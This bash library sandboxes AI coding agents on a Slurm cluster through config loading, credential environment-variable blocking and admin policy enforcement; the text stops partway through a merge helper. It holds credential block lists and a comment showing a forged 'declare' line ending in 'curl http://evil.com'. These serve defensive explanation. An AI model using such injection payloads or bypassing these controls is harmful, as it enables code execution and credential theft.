#! /bin/bash --
# sandbox-lib.sh — Core sandbox library (backend-agnostic)
#
# Sourced by sandbox-exec.sh, sbatch-sandbox.sh, srun-sandbox.sh.
# Reads configuration from sandbox.conf, detects the best available backend,
# and provides:
#
#   detect_backend            — sets SANDBOX_BACKEND (bwrap, firejail, or landlock)
#   validate_project_dir DIR  — checks DIR is allowed
#   backend_available         — can this backend work?
#   backend_prepare DIR       — set up the sandbox for DIR
#   backend_exec CMD...       — run CMD inside the sandbox (execs)
#   backend_dry_run CMD...    — print what would be run

set -euo pipefail

# Require bash >= 4.4 for safe empty-array expansion under set -u.
# (In bash < 4.4, "${empty_array[@]}" is an unbound variable error.)
if [[ "${BASH_VERSINFO[0]}" -lt 4 ]] || { [[ "${BASH_VERSINFO[0]}" -eq 4 && "${BASH_VERSINFO[1]}" -lt 4 ]]; }; then
    echo "Error: sandbox-lib.sh requires bash >= 4.4 (found ${BASH_VERSION})." >&2
    exit 1
fi

SANDBOX_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"

# Build list of Slurm binaries to block inside the sandbox.
# Derived from chaperon/stubs/ — any executable file whose name does NOT
# start with "_" is treated as a command to block in /usr/bin.
# This also includes common Slurm binaries that we block even without stubs.
# All Slurm communication goes through the chaperon (outside the sandbox).
_build_chaperon_blocked_binaries() {
    CHAPERON_BLOCKED_BINARIES=()
    local stubs_dir="$SANDBOX_DIR/chaperon/stubs"
    if [[ -d "$stubs_dir" ]]; then
        for stub in "$stubs_dir"/*; do
            [[ -x "$stub" ]] || continue
            local name
            name="$(basename "$stub")"
            [[ "$name" == _* ]] && continue
            CHAPERON_BLOCKED_BINARIES+=("$name")
        done
    fi
    # salloc and sattach now have proper stubs and are picked up automatically above.
}

# Resolve HOME from the password database, not the environment variable.
# An agent (or user config) could export HOME=/tmp/evil before the sandbox
# starts, redirecting all home-relative paths.  getent passwd is authoritative.
HOME="$(getent passwd "$(id -un)" 2>/dev/null | cut -d: -f6)" || true
if [[ -z "$HOME" ]]; then
    # Fallback: the ~ expansion uses the passwd entry, not $HOME.
    HOME="$(cd ~ && pwd)"
fi
export HOME

# User data directory — user-owned config, temp data.
# Separate from SANDBOX_DIR (script location) so that an admin-owned install
# at e.g. /app/lib/agent-sandbox/ can coexist with per-user customization.
# Agent-specific paths (e.g., .claude, .codex, .gemini) are managed by
# agent profiles in agents/<name>/.
_USER_DATA_DIR="${HOME}/.config/agent-sandbox"
mkdir -p "$_USER_DATA_DIR"

SANDBOX_CONF="${SANDBOX_CONF:-$_USER_DATA_DIR/sandbox.conf}"

# ── Defaults (overridden by sandbox.conf) ───────────────────────

ALLOWED_PROJECT_PARENTS=("/fh/fast" "/fh/scratch" "$HOME")

READONLY_MOUNTS=(
    "/usr" "/lib" "/lib64" "/bin" "/sbin" "/etc"
    "/app"
)

HOME_READONLY=(
    ".bashrc" ".bash_profile" ".profile"
    ".zshrc" ".zprofile"
    ".inputrc"
    ".gitconfig"
    ".vimrc" ".vim"
    ".tmux.conf"
    ".dircolors"
    ".pythonrc"
    ".linuxbrew"
    ".local/bin"
    ".local/share/jupyter"
    "micromamba"
    ".condarc"
    ".mambarc"
    # Per-agent read-only entries (e.g. ".aider.conf.yml") are added
    # automatically by _apply_agent_profiles() from each enabled
    # agent's config.conf. See ENABLED_AGENTS below.
)

HOME_WRITABLE=(
    ".cache/uv"
    # Per-agent state/credential entries (e.g. ".claude", ".codex",
    # ".config/opencode") are added automatically by
    # _apply_agent_profiles() from each enabled agent's config.conf.
    # See ENABLED_AGENTS below. Missing entries are auto-created by
    # _ensure_writable_home_dirs so first-run in-sandbox auth works
    # without prior setup.
)

# Agent profiles in agents/<name>/ to enable. Each enabled agent
# contributes its declared writable/readable/blocked paths (from
# agents/<name>/config.conf) to the sandbox surface, and its
# overlay.sh runs to merge AGENTS.md / settings into a sandbox config
# dir. Adding a name with no matching agents/<name>/ directory is
# silently ignored. Adding an agent expands the writable surface to
# whatever its config.conf declares — only enable agents you actually
# use, so e.g. ~/.pi or ~/.config/opencode (which could be unrelated
# user data) don't become writable for users who don't run those
# agents. Available profiles not enabled by default: aider, opencode,
# pi (uncomment "ENABLED_AGENTS+=(...)" in sandbox.conf to enable).
ENABLED_AGENTS=("claude" "codex" "gemini")

# Home access mode:
#   tmpwrite   — (default) tmpfs HOME, selective mounts, writable tmpfs (ephemeral writes, lost on exit)
#   restricted — like tmpwrite but tmpfs is read-only (strictest)
#   read       — full real HOME readable; .ssh/.aws/.gnupg still hidden
#   write      — full real HOME writable; .ssh/.aws/.gnupg still hidden
# Can override via env: HOME_ACCESS=read sandbox-exec.sh -- bash
HOME_ACCESS="tmpwrite"

# Credential dirs that are ALWAYS hidden regardless of HOME_ACCESS mode.
# In restricted mode these are hidden implicitly (never listed in HOME_READONLY).
# In read/write modes they are explicitly blocked (tmpfs/blacklist).
_HOME_ALWAYS_BLOCKED=(".ssh" ".aws" ".gnupg")

BLOCKED_FILES=(
    # Per-agent instruction files (e.g. ~/.claude/CLAUDE.md,
    # ~/.codex/AGENTS.md) are added automatically by
    # _apply_agent_profiles() from each enabled agent's config.conf.
    # The matching overlay.sh exports a *_CONFIG_DIR env var so the
    # agent reads the sandbox-merged copy instead.
)

EXTRA_BLOCKED_PATHS=()

EXTRA_WRITABLE_PATHS=()

# Per-project environment variables (KEY=VALUE strings).
# Applied to the host environment before the backend runs, so backend
# PATH prepends (chaperon stubs, sandbox bin) layer on top naturally.
# Use ${PATH} in values to reference the current PATH, e.g.:
#   SANDBOX_ENV+=("PATH=/my/bin:${PATH}")
# Set these in conf.d/*.conf files, guarded by _PROJECT_DIR.
SANDBOX_ENV=()

# Lmod modules to load before backend detection (e.g., newer bwrap).
# Set in sandbox.conf; used by _load_sandbox_modules().
SANDBOX_MODULES=()

# Admin deny-list: paths that must NEVER be writable, regardless of
# user config. EXTRA_WRITABLE_PATHS entries matching these (or under
# them) are stripped with a warning. Admins set this in the admin sandbox.conf.
DENIED_WRITABLE_PATHS=()

# Path to the Slurm sandbox bypass token (see ADMIN_HARDENING.md §1).
# When set, the bwrap backend automatically hides this file from the sandbox
# (overlays it with /dev/null). For the Landlock backend, use the eBPF LSM
# program instead (see slurm-enforce/token_protect.bpf.c).
# Can be set as SANDBOX_BYPASS_TOKEN or TOKEN_FILE (the Slurm wrapper name).

# Isolate /tmp with a private tmpfs (bwrap and firejail backends).
# Default: true. Set to false if the sandboxed process needs shared /tmp
# access (e.g., MPI shared-memory transport between ranks on the same node,
# or NCCL inter-GPU communication via /tmp sockets).
# Preserve env overrides for security booleans before setting defaults.
# Restored after config loading (but admin enforcement still wins).
_PRIVATE_TMP_OVERRIDE="${PRIVATE_TMP:-}"
_PRIVATE_IPC_OVERRIDE="${PRIVATE_IPC:-}"
_FILTER_PASSWD_OVERRIDE="${FILTER_PASSWD:-}"

PRIVATE_TMP=true

# IPC namespace isolation. Gives each sandbox its own SysV IPC namespace
# and a private /dev/shm. Prevents host or cross-sandbox shared memory access.
# MPI/NCCL within a single job are unaffected (all ranks share one sandbox).
# Default: true. Set to false for workloads needing host-to-sandbox shm.
PRIVATE_IPC=true

# Filter /etc/passwd inside the sandbox to prevent LDAP/AD user enumeration.
# When true, generates a minimal /etc/passwd (system UIDs < 1000 + current
# user) and overrides nsswitch.conf to use "files" only (no ldap/sss).
# bwrap: overlays /etc/passwd + /etc/nsswitch.conf via --ro-bind.
# firejail: blocks NSS daemon sockets (nscd, nslcd, sssd).
# landlock: not supported (no mount namespace).
FILTER_PASSWD=true

# Bind host /dev into the sandbox instead of bwrap's minimal devtmpfs.
# Required for tmux (pty allocation) on kernels < 5.4. Exposes host
# /dev/pts — on kernels < 6.2 a same-user process could use TIOCSTI
# to inject keystrokes into unsandboxed terminals. See sandbox.conf.
BIND_DEV_PTS=false

# Suppress the startup banner. Set to true to hide the one-line message
# showing backend, project dir, and home access mode.
SANDBOX_QUIET=false

# Backend selection. Empty means auto-detect (bwrap > firejail > landlock).
# Can be overridden by --backend flag, SANDBOX_BACKEND env, or config file.
# Preserve any value from env/CLI before setting the default — the override
# is restored after config loading (see _SANDBOX_BACKEND_OVERRIDE below).
SANDBOX_BACKEND="${SANDBOX_BACKEND:-}"

# Path to the Slurm bypass token file. bwrap/firejail hide it inside
# the sandbox. Can be set as SANDBOX_BYPASS_TOKEN or TOKEN_FILE (the
# Slurm wrapper name).
SANDBOX_BYPASS_TOKEN=""

# Process limit (defense-in-depth against fork bombs). Empty = no limit.
# Sets RLIMIT_NPROC via ulimit -u / firejail --rlimit-nproc.
# Note: counts per-UID system-wide, not per-sandbox. Admin cgroups with
# pids.max are the primary defense; this is a supplemental safeguard.
SANDBOX_NPROC_LIMIT=""

# Silence per-agent credential/path warnings emitted at startup. List
# agent names (matching agents/<name>/ directories) or "all" to disable
# every agent warning. Configurable via sandbox.conf.
SUPPRESS_AGENT_WARNINGS=()

BLOCKED_ENV_VARS=(
    # Specific names NOT caught by BLOCKED_ENV_PATTERNS globs.
    # Names like GITHUB_TOKEN, OPENAI_API_KEY, AWS_SESSION_TOKEN, SSH_*, etc.
    # are already matched by patterns — no need to list them here.
    "GITHUB_PAT"
    # Cloud & service credentials
    "AWS_ACCESS_KEY_ID"
    "ST_AUTH" "SW2_URL"
    # Database credentials
    "DATABASE_URL" "PGPASSWORD" "MYSQL_PWD" "MONGO_URI"
    "REDIS_URL"
    # Google service account
    "GOOGLE_APPLICATION_CREDENTIALS"
    # Personal / email
    "MUTT_EMAIL_ADDRESS" "MUTT_REALNAME" "MUTT_SMTP_URL"
    # Session / system info
    "KRB5CCNAME"
    "SLURM_CONF" "SLURM_CONFIG_DIR"
    "DBUS_SESSION_BUS_ADDRESS" "OLDPWD"
    "TMUX" "TMUX_PANE"
    # Note: vars matching BLOCKED_ENV_PATTERNS globs (SSH_*, *_TOKEN,
    # *_SECRET, *_PASSWORD, *_API_KEY, *_CREDENTIAL, *_SECRET_KEY,
    # *_PRIVATE_KEY, DOCKER_*, CI_*, AZURE_*, GCP_*, etc.) are blocked
    # automatically — do not duplicate them here.
)

# Credential-pattern globs: block env vars matching common credential naming
# conventions. Configurable via sandbox.conf / user.conf (admin-enforced).
# To let a specific variable through, add it to ALLOWED_ENV_VARS.
BLOCKED_ENV_PATTERNS=(
    "SSH_*"
    "*_TOKEN"  "*_SECRET"  "*_PASSWORD"  "*_CREDENTIAL"
    "*_API_KEY"  "*_SECRET_KEY"  "*_PRIVATE_KEY"
    "AZURE_*"  "GCP_*"  "GCLOUD_*"  "GOOGLE_CLOUD_*"
    "DOCKER_*"  "REGISTRY_*"
    "CI_*"  "GITLAB_*"  "JENKINS_*"  "BUILDKITE_*"  "CIRCLECI_*"
)

# Allowed env vars: overrides both BLOCKED_ENV_VARS and BLOCKED_ENV_PATTERNS (incl. SSH_*)
# Agent API keys are allowed by default so agents that use env-var auth
# (codex, aider, opencode, gemini) work on first launch. Users who want
# OAuth-only can drop entries via their sandbox.conf / conf.d overrides.
ALLOWED_ENV_VARS=(
    "ANTHROPIC_API_KEY"
    "OPENAI_API_KEY"
    "CODEX_API_KEY"
    "GOOGLE_API_KEY"
)

# ── Helper: check if an env var is in ALLOWED_ENV_VARS ────────
# Used by backends to skip blocking for explicitly allowed vars.
_is_allowed_env() {
    local _var="$1"
    for _a in "${ALLOWED_ENV_VARS[@]}"; do
        [[ "$_var" == "$_a" ]] && return 0
    done
    return 1
}

# ── Helper: check if an env var matches a hardcoded credential pattern ──
# Returns 0 (true) if the variable should be blocked by pattern.
# ALLOWED_ENV_VARS overrides pattern matches.
_is_blocked_by_pattern() {
    local _var="$1"
    _is_allowed_env "$_var" && return 1
    for _glob in "${BLOCKED_ENV_PATTERNS[@]}"; do
        # shellcheck disable=SC2254
        case "$_var" in $_glob) return 0 ;; esac
    done
    return 1
}

# ── Helper: emit a one-time warning listing all pattern-blocked env vars ──
# Called once by each backend during prepare, only when SANDBOX_QUIET is false.
# Shows which vars will be blocked by the credential-pattern globs so users
# can diagnose missing vars and know to use ALLOWED_ENV_VARS to override.
_warn_pattern_blocked_vars() {
    _is_true "${SANDBOX_QUIET:-false}" && return
    # Suppress on compute nodes: the chaperon (outside sandbox) passes its
    # full environment to sbatch. The warning would appear in job stderr
    # (readable by the sandboxed agent) and leak how many secrets exist.
    [[ -n "${SLURM_JOB_ID:-}" ]] && return
    local _count=0
    while IFS='=' read -r _name _; do
        _is_blocked_by_pattern "$_name" && (( _count++ )) || true
    done < <(env)
    if [[ $_count -gt 0 ]]; then
        # Only print count, not names — the names of credentials are themselves
        # sensitive (reveal what services the user authenticates to).
        echo "sandbox: $_count env var(s) blocked by credential patterns (see sandbox.conf)" >&2
    fi
}

# ── Helpers: boolean normalization ─────────────────────────────
# Accept true/True/TRUE/yes/1 as truthy; everything else is false.
# Used for all boolean config values to prevent silent misconfiguration.
_is_true() {
    case "${1,,}" in  # bash 4+ lowercase
        true|yes|1) return 0 ;;
        *) return 1 ;;
    esac
}

# ── Multi-level config loading ──────────────────────────────────
#
# Config hierarchy (each layer adds to the previous):
#   1. Defaults (above)
#   2. Admin config (/app/lib/agent-sandbox/sandbox.conf) — security baseline
#   3. User config ($_USER_DATA_DIR/user.conf) — additive customization
#   4. Per-project overrides ($_USER_DATA_DIR/conf.d/*.conf)
#
# When an admin config exists at the hardcoded path, it is loaded first
# as a security baseline. The user's config ($_USER_DATA_DIR/user.conf)
# can add entries to security-critical arrays (BLOCKED_FILES,
# BLOCKED_ENV_VARS, EXTRA_BLOCKED_PATHS) but not remove admin-set
# ones. Items in the admin's HOME_READONLY cannot be moved to
# HOME_WRITABLE. The admin path is hardcoded (not an env var) to
# prevent an agent from redirecting it to a controlled directory.
#
# Without an admin config, $_USER_DATA_DIR/sandbox.conf is the only config.
# See ADMIN_INSTALL.md for setup instructions.

# Preserve any SANDBOX_BACKEND set via environment or --backend flag
# so config files cannot override an explicit backend selection.
_SANDBOX_BACKEND_OVERRIDE="${SANDBOX_BACKEND:-}"

# --- Determine config files ---
# Admin config path — set as a script variable, not from environment.
# An env var would let an agent redirect to an attacker-controlled dir.
# Change this line if the admin sandbox is installed elsewhere.
_ADMIN_CONF=""
_USER_CONF=""
_ADMIN_DIR="/app/lib/agent-sandbox"

if [[ "${SANDBOX_CONF:-}" != "" && "$SANDBOX_CONF" != "$_USER_DATA_DIR/sandbox.conf" ]]; then
    # Explicit SANDBOX_CONF override — single config, backward compat
    _USER_CONF="$SANDBOX_CONF"
elif [[ -f "$_ADMIN_DIR/sandbox.conf" ]]; then
    # Admin-installed: admin config is authoritative, user gets user.conf
    _ADMIN_CONF="$_ADMIN_DIR/sandbox.conf"
    if [[ -f "$_USER_DATA_DIR/user.conf" ]]; then
        _USER_CONF="$_USER_DATA_DIR/user.conf"
    elif [[ -f "$_USER_DATA_DIR/sandbox.conf" ]]; then
        # Fallback: accept sandbox.conf as user config (common when users
        # have customized sandbox.conf before admin install was deployed).
        _USER_CONF="$_USER_DATA_DIR/sandbox.conf"
    else
        _USER_CONF="$_USER_DATA_DIR/user.conf"  # Expected path (will be missing)
    fi
else
    # User-only install: single config
    _USER_CONF="$_USER_DATA_DIR/sandbox.conf"
fi

# --- Auto-init: deploy user config ---
# Always deploy the full sandbox.conf template to the user dir, even
# when an admin config exists (users need their own customization layer).
# The template source is sandbox.conf.template in the install dir (falls
# back to sandbox.conf if no template exists). This avoids copying the
# admin skeleton when an admin has replaced sandbox.conf.
_user_conf_target="$_USER_DATA_DIR/sandbox.conf"
_user_conf_sha="$_USER_DATA_DIR/.sandbox.conf.origin-sha256"
_user_conf_template="$SANDBOX_DIR/sandbox.conf.template"
[[ -f "$_user_conf_template" ]] || _user_conf_template="$SANDBOX_DIR/sandbox.conf"

if [[ -f "$_user_conf_template" ]]; then
    _src_sha="$(sha256sum "$_user_conf_template" | cut -d' ' -f1)"
    if [[ ! -f "$_user_conf_target" ]]; then
        # First run — deploy
        mkdir -p "$_USER_DATA_DIR"
        cp "$_user_conf_template" "$_user_conf_target"
        echo "$_src_sha" > "$_user_conf_sha"
        echo "sandbox: created sandbox.conf in $_USER_DATA_DIR" >&2
        echo "  edit to customize: \$EDITOR $_user_conf_target" >&2
    elif [[ -f "$_user_conf_sha" ]]; then
        # Upgrade — overwrite only if user hasn't modified
        _dest_sha="$(sha256sum "$_user_conf_target" | cut -d' ' -f1)"
        _origin_sha="$(cat "$_user_conf_sha" 2>/dev/null)"
        if [[ "$_dest_sha" == "$_origin_sha" && "$_dest_sha" != "$_src_sha" ]]; then
            cp "$_user_conf_template" "$_user_conf_target"
            echo "$_src_sha" > "$_user_conf_sha"
            _is_true "${SANDBOX_QUIET:-false}" || \
                echo "sandbox: updated sandbox.conf (new defaults from upgrade)" >&2
        fi
    fi
fi
unset _user_conf_target _user_conf_sha _user_conf_template _src_sha _dest_sha _origin_sha

# --- Config variable names (single source of truth) ---
# Arrays and scalars that config files can set. Used by _load_untrusted_config
# to serialize/deserialize state and by _enforce_admin_policy to merge.
_CONFIG_ARRAYS=(
    ALLOWED_PROJECT_PARENTS READONLY_MOUNTS HOME_READONLY HOME_WRITABLE
    BLOCKED_FILES BLOCKED_ENV_VARS BLOCKED_ENV_PATTERNS ALLOWED_ENV_VARS
    EXTRA_BLOCKED_PATHS EXTRA_WRITABLE_PATHS DENIED_WRITABLE_PATHS
    SANDBOX_ENV SUPPRESS_AGENT_WARNINGS SANDBOX_MODULES ENABLED_AGENTS
)
_CONFIG_SCALARS=(
    SANDBOX_BACKEND PRIVATE_TMP PRIVATE_IPC FILTER_PASSWD BIND_DEV_PTS
    SLURM_SCOPE HOME_ACCESS SANDBOX_QUIET SANDBOX_NPROC_LIMIT
    CHAPERON_LOG_LEVEL CHAPERON_LOG_RETAIN_DAYS
)
# Enforced arrays: user cannot remove admin-set entries (only add).
_ENFORCED_ARRAYS=(BLOCKED_FILES BLOCKED_ENV_VARS BLOCKED_ENV_PATTERNS EXTRA_BLOCKED_PATHS)
# Token paths are admin-only — set in the admin config (sourced directly),
# never extracted from user configs.  Keeping them out of _CONFIG_SCALARS
# prevents users from overriding them and avoids declare -p failures when
# TOKEN_FILE has no default.

# --- Load an untrusted config file in an isolated subprocess ---
#
# Runs the config in a child bash process — no side effects in the parent.
# Serializes current state into the child, sources the config, then extracts
# only the known config variables via declare -p.
#
# This eliminates entire attack classes: DEBUG traps, exit/return, IFS
# manipulation, background processes, eval overrides — none can escape
# the subprocess boundary.
#
# The child's declare -p output is UNTRUSTED (the config could override
# `declare` as a function) and undergoes three-layer validation before
# being eval'd in the parent:
#   1. Prefix check: every line must start with 'declare '.
#   2. Name whitelist: the variable name must be in the allowed set.
#   3. Round-trip: eval the output in a clean subprocess and re-serialize
#      with the real declare -p — any injected payload causes a mismatch.
_load_untrusted_config() {
    local _conf="$1"
    local _label="${2:-Config}"

    if [[ ! -f "$_conf" ]]; then
        return 0
    fi

    # Syntax check (usability, not security — the subprocess handles safety)
    if ! bash -n "$_conf" 2>/dev/null; then
        echo "Error: Syntax error in $_conf" >&2
        bash -n "$_conf" >&2
        exit 1
    fi

    # Warn about unknown variable assignments (static check — no eval).
    # Catches stale config from older versions without runtime side effects.
    local _known_vars=" $(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}") "
    local _unknown_var _unknown_list=()
    while IFS= read -r _unknown_var; do
        [[ -n "$_unknown_var" ]] || continue
        [[ "$_known_vars" == *" $_unknown_var "* ]] || _unknown_list+=("$_unknown_var")
    done < <(grep -oE '^[A-Z_][A-Z_0-9]*\+?=' "$_conf" | sed 's/+\?=$//' | sort -u)
    if [[ ${#_unknown_list[@]} -gt 0 ]]; then
        echo "sandbox: WARNING: ${_label} ($(basename "$_conf")) sets ${#_unknown_list[@]} unknown variable(s): ${_unknown_list[*]}" >&2
        echo "  These variables are ignored. They may be from an older version — re-run install.sh to update." >&2
    fi

    # Serialize current state for the subprocess
    local _parent_state
    _parent_state="$(declare -p "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}" 2>/dev/null || true)"

    # Run config in isolated subprocess, extract only known variables.
    # The subprocess inherits nothing except the serialized state.
    #
    # SECURITY: After `. "$2"` runs untrusted code, any bash builtin name
    # (declare, builtin, unset, command) could have been overridden as a
    # shell function.  Calling `declare -p` would execute the attacker's
    # function, whose output could pass a naive `^declare ` prefix check
    # while injecting arbitrary commands into the eval in the parent.
    #
    # You cannot prevent function overrides inside the subprocess — even
    # `builtin` itself can be overridden.  Therefore, the subprocess output
    # is treated as UNTRUSTED, and the parent applies strict validation
    # (see "Defence layers" below) before eval'ing it.
    local _var_names
    _var_names="$(printf '%s ' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"

    local _result _exit_code=0
    _result="$( /bin/bash --norc --noprofile -c '
        # Seed with parent state
        eval "$1"
        # Source the untrusted config
        . "$2" 2>/dev/null
        # Extract config variables.  If the config overrode declare as a
        # function, this calls the attacker'\''s code — but the parent
        # validates the output before eval'\''ing it (see below).
        declare -p '"$_var_names"' 2>/dev/null
    ' -- "$_parent_state" "$_conf" )" || _exit_code=$?

    if [[ $_exit_code -ne 0 ]]; then
        echo "WARNING: ${_label} exited with code ${_exit_code} — using values it set before exiting." >&2
    fi

    # --- Strict validation of subprocess output ---
    #
    # The subprocess output is UNTRUSTED because user config can override
    # `declare` (and even `builtin`) as shell functions.  A malicious
    # declare function could emit lines like:
    #   declare -g -- SANDBOX_BACKEND="bwrap"; curl http://evil.com #"
    # which starts with 'declare ' and would pass a prefix-only check.
    #
    # Defence layer 1: every line must start with 'declare '.
    # Defence layer 2: variable name whitelist — each line's variable name
    #   must be in _CONFIG_ARRAYS or _CONFIG_SCALARS.
    # Defence layer 3: structural validation — each line must match the
    #   EXACT format that real `declare -p` produces, with no trailing
    #   content after the value.  We parse line-by-line in the parent
    #   (which has clean builtins) and reject anything that doesn't
    #   round-trip cleanly through declare -p.
    if [[ -n "$_result" ]]; then
        # Layer 1: prefix check (fast reject of obvious garbage).
        local _bad_lines
        _bad_lines="$(echo "$_result" | grep -cvE '^declare ' || true)"
        if [[ "$_bad_lines" -gt 0 ]]; then
            echo "FATAL: ${_label} produced unexpected output — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Layer 2: variable name whitelist.
        # Build alternation of allowed names.
        local _allowed_re
        _allowed_re="$(printf '%s|' "${_CONFIG_ARRAYS[@]}" "${_CONFIG_SCALARS[@]}")"
        _allowed_re="${_allowed_re%|}"  # strip trailing |

        # Real declare -p output forms (bash 4.4+):
        #   declare -- VAR="value"
        #   declare -a VAR=([0]="v1" [1]="v2")
        #   declare -A VAR=([k]="v")
        #   declare -x VAR="value"
        #   declare -ar VAR=([0]="v1")
        # The flags field is a single group of letters after '-'.
        # '--' appears for untyped variables.
        local _name_bad
        _name_bad="$(echo "$_result" | grep -cvE "^declare (-[aAxir-]+ )*(-- )?($_allowed_re)=" || true)"
        if [[ "$_name_bad" -gt 0 ]]; then
            echo "FATAL: ${_label} declared unexpected variable names — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Layer 3: round-trip validation.
        # Eval each line in a CLEAN subprocess, then re-serialize with the
        # real declare -p.  If the re-serialized output differs from the
        # input, the line contained injected content (e.g., embedded
        # commands after the value that execute during eval but don't
        # appear in the re-serialized form).
        #
        # This is the strongest defence: even if an attacker crafts a line
        # that passes the prefix and name checks, any side-effect payload
        # (command substitution, ;-separated commands, etc.) will execute
        # in this isolated validation subprocess (not the parent) and will
        # NOT appear in the re-serialized output, causing a mismatch.
        local _roundtrip
        _roundtrip="$( /bin/bash --norc --noprofile -c '
            eval "$1"
            declare -p '"$_var_names"' 2>/dev/null
        ' -- "$_result" )" || true

        if [[ "$_roundtrip" != "$_result" ]]; then
            echo "FATAL: ${_label} output failed round-trip validation — refusing to load." >&2
            echo "  File: $_conf" >&2
            return 1
        fi

        # Apply extracted values to GLOBAL scope.
        # declare -p output produces 'declare -a VAR=(...)' for arrays and
        # 'declare -- VAR="..."' for scalars. Plain 'declare' inside a function
        # creates LOCAL variables, so the changes would never reach global scope.
        # Fix: add -g flag to make declarations global.
        _result="$(echo "$_result" | sed \
            -e 's/^declare -a /declare -ga /' \
            -e 's/^declare -A /declare -gA /' \
            -e 's/^declare -- /declare -g -- /' \
            -e 's/^declare -x /declare -gx /')"
        eval "$_result"
    fi
}

# --- Enforce admin policy: compare extracted values against admin snapshot ---
#
# After loading untrusted config (user.conf or conf.d), this function:
# 1. Warns about removed admin entries or overridden scalars
# 2. Restores admin values as the base
# 3. Merges user additions on top
# 4. Strips DENIED_WRITABLE_PATHS violations
#
# This is a pure comparison — no re-sourcing, no eval of untrusted code.
_enforce_admin_policy() {
    local _label="${1:-Config}"

    # --- Warn about violations ---
    local _a _item _found _aro

    # Enforced arrays: warn about removed admin entries
    for _a in "${_ADMIN_BLOCKED_FILES[@]}"; do
        _found=false
        for _item in "${BLOCKED_FILES[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced BLOCKED_FILES entry '${_a}' — restored." >&2
    done
    for _a in "${_ADMIN_BLOCKED_ENV_VARS[@]}"; do
        _found=false
        for _item in "${BLOCKED_ENV_VARS[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced BLOCKED_ENV_VARS entry '${_a}' — restored." >&2
    done
    for _a in "${_ADMIN_BLOCKED_ENV_PATTERNS[@]}"; do
        _found=false
        for _item in "${BLOCKED_ENV_PATTERNS[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced BLOCKED_ENV_PATTERNS entry '${_a}' — restored." >&2
    done
    for _a in "${_ADMIN_EXTRA_BLOCKED_PATHS[@]}"; do
        _found=false
        for _item in "${EXTRA_BLOCKED_PATHS[@]}"; do [[ "$_item" == "$_a" ]] && { _found=true; break; }; done
        $_found || echo "WARNING: ${_label} removed admin-enforced EXTRA_BLOCKED_PATHS entry '${_a}' — restored." >&2
    done

    # HOME_READONLY → HOME_WRITABLE escalation
    for _aro in "${_ADMIN_HOME_READONLY[@]}"; do
        for _item in "${HOME_WRITABLE[@]}"; do
            [[ "$_item" == "$_aro" ]] && echo "WARNING: ${_label} moved admin HOME_READONLY entry '${_aro}' to HOME_WRITABLE — reverted." >&2
        done
    done

    # Security-critical booleans: user can harden (false→true) but not
    # weaken (true→false) an admin-set value.
    local _bool_name _admin_val _user_val
    for _bool_name in PRIVATE_TMP PRIVATE_IPC FILTER_PASSWD; do
        eval "_admin_val=\"\${_ADMIN_${_bool_name}:-}\""
        eval "_user_val=\"\${${_bool_name}:-}\""
        if _is_true "$_admin_val" && ! _is_true "$_user_val"; then
            echo "WARNING: ${_label} weakened admin-enforced ${_bool_name}=true → restored." >&2
            eval "${_bool_name}=true"
        fi
    done

    # --- Collect user-only additions (items not in admin snapshot) ---
    # Save the user's arrays before restoring admin values.
    local _user_bf=("${BLOCKED_FILES[@]}")
    local _user_bev=("${BLOCKED_ENV_VARS[@]}")
    local _user_bep=("${BLOCKED_ENV_PATTERNS[@]}")
    local _user_aev=("${ALLOWED_ENV_VARS[@]}")
    local _user_ebp=("${EXTRA_BLOCKED_PATHS[@]}")
    local _user_hw=("${HOME_WRITABLE[@]}")
    local _user_ewp=("${EXTRA_WRITABLE_PATHS[@]}")
    local _user_rom=("${READONLY_MOUNTS[@]}")
    local _user_hro=("${HOME_READONLY[@]}")
    local _user_app=("${ALLOWED_PROJECT_PARENTS[@]}")

    # --- Restore admin base values ---
    BLOCKED_FILES=("${_ADMIN_BLOCKED_FILES[@]}")
    BLOCKED_ENV_VARS=("${_ADMIN_BLOCKED_ENV_VARS[@]}")
    BLOCKED_ENV_PATTERNS=("${_ADMIN_BLOCKED_ENV_PATTERNS[@]}")
    ALLOWED_ENV_VARS=("${_ADMIN_ALLOWED_ENV_VARS[@]}")
    EXTRA_BLOCKED_PATHS=("${_ADMIN_EXTRA_BLOCKED_PATHS[@]}")
    HOME_READONLY=("${_ADMIN_HOME_READONLY[@]}")
    EXTRA_WRITABLE_PATHS=("${_ADMIN_EXTRA_WRITABLE_PATHS[@]}")
    READONLY_MOUNTS=("${_ADMIN_READONLY_MOUNTS[@]}")
    ALLOWED_PROJECT_PARENTS=("${_ADMIN_ALLOWED_PROJECT_PARENTS[@]}")
    HOME_WRITABLE=("${_ADMIN_HOME_WRITABLE[@]}")
    DENIED_WRITABLE_PATHS=("${_ADMIN_DENIED_WRITABLE_PATHS[@]}")
    SANDBOX_BYPASS_TOKEN="$_ADMIN_SANDBOX_BYPASS_TOKEN"
    TOKEN_FILE="$_ADMIN_TOKEN_FILE"

    # --- Merge: admin base + user-only additions ---
    local _in_admin
    local _saved_ref _admin_ref
    # Helper: append items from user array that aren't in admin array
    _merge_additions() {
        local -n _user_arr=$1 _admin_arr=$2 _target_arr=$3
        for _item in "${_user_arr[@]}"; do
            _in_admin=false
            for _a in "${_admin_arr[@]}"; do
                [[ "$_item" == "$_a" ]] && { _in_admin=true; break; }
            done
            $_in_admin || _target_arr+=("$_item")
        done
    }
    _merge_additions _user_bf   _ADMIN_BLOCKED_FILES          BLOCKED_FILES
    _merge_additions _user_bev  _ADMIN_BLOCKED_ENV_VARS       BLOCKED_ENV_VARS
    _merge_additions _user_bep  _ADMIN_BLOCKED_ENV_PATTERNS   BLOCKED_ENV_PATTERNS
    _merge_additions _user_aev  _ADMIN_ALLOWED_ENV_VARS       ALLOWED_ENV_VARS
    _merge_additions _user_ebp  _ADMIN_EXTRA_BLOCKED_PATHS    EXTRA_BLOCKED_PATHS
